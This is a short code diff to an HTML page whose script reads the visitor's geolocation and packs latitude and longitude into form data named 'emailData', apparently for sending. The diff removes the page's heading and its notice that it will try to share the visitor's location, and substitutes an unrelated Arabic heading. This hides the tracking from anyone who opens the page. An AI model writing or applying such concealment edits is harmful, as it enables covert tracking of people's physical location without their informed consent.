@@ -11,7 +11,7 @@
                 // Request permission to access location
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        const { latitude, longitude } = position.coords;
+                        const { latitude, longitude } = position.coords;  // Actual location
 
                         const emailData = new FormData();
                         emailData.append('latitude', latitude);
@@ -44,8 +44,7 @@
     </script>
 </head>
 <body>
-    <h1>Location Sharing Helper</h1>
-    <p>This page will try to automatically share your location. Please ensure you click "Allow" when prompted by your browser to share your location.</p>
-    <p>If you deny permission, your location will not be shared.</p>
+    <h1>هسيبك لخيالك</h1>
+
 </body>
 </html>
